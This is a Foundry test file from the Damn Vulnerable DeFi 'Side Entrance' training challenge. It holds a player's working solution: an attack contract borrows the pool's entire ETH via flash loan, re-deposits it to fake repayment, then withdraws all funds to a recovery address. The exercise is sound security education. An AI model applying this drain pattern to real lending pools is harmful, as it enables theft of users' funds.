// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        AttackContract attackContract = new AttackContract(address(pool), recovery);
        attackContract.callFlashloan();
        attackContract.withdraw(payable(recovery));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}

contract AttackContract {
    address public owner;
    address public recovery;

    SideEntranceLenderPool public pool;

    constructor(address poolAddress, address recovery) {
        owner = msg.sender;
        pool = SideEntranceLenderPool(poolAddress);
        recovery = recovery;
    }

    // fallback() external payable {
    //     pool.deposit{value: address(this).balance}();
    //     // require(false, "Fallback trigerred");
    //     require(pool.balances(address(this)) == 1000e18, "Failed to reflect in deposit amount");
    //     require(address(pool).balance == 1000e18, "Failed to repay flash loan");
    //     require(address(this).balance == 0, "AttackContract still has ETH");
    // }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
        // require(false, "Fallback trigerred");
        require(pool.balances(address(this)) == 1000e18, "Failed to reflect in deposit amount");
        require(address(pool).balance == 1000e18, "Failed to repay flash loan");
        require(address(this).balance == 0, "AttackContract still has ETH");
    }

    function callFlashloan() external {
        require(msg.sender == owner, "AttackContract: Only owner can call");
        pool.flashLoan(address(pool).balance);
    }

    // function withdraw(address payable receiver) external {
    //     require(msg.sender == owner, "AttackContract: Only owner can call");
    //     // require(false, "Withdraw trigerred");
    //     pool.withdraw();
    //     require(address(pool).balance == 0, "Failed to withdraw ETH, Pool still has ETH");
    //     require(address(this).balance == 1000e18, "Failed to withdraw ETH, AttackContract has no ETH");
    //     receiver.transfer(address(this).balance);
    // }
    function withdraw(address payable receiver) public {
        // require(msg.sender == owner, "AttackContract: Only owner can call");

        // uint256 poolBalanceBefore = address(pool).balance;
        // uint256 attackContractBalanceBefore = address(this).balance;

        require(pool.balances(address(this)) == 1000e18, "Withdrawable amount in pool not reflected");
        require(address(pool).balance == 1000e18, "Pool don't have balance to withdraw");
        pool.withdraw();
        require(address(this).balance > 0, "Funds wasn't withdrew to AttackContract");

        // require(address(pool).balance == 0, "Failed to withdraw ETH, Pool still has ETH");
        // require(address(this).balance == poolBalanceBefore, "Failed to withdraw correct amount of ETH");

        receiver.transfer(address(this).balance);
    }

    receive() external payable {}
}
